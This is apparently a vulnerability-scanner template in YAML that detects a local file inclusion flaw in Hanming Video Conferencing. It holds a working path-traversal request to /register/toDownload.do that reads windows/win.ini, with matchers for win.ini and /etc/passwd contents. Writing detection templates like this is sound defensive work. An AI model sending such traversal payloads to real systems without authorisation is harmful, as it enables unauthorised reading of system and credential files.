id: "hanming-lfr"
name: "Hanming Video Conferencing - Local File Inclusion"
severity: "high"
description: "Hanming Video Conferencing is vulnerable to local file inclusion."
tech:
  - "generic"
tags:
  - "lfr"
  - "hanming"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA"
spaExclusion: true
request:
  method: "GET"
  path: "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "or"
matchers:
  - type: "word"
    part: "body"
    words:
      - "bit app support"
      - "fonts"
      - "extensions"
    condition: "and"
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0:"
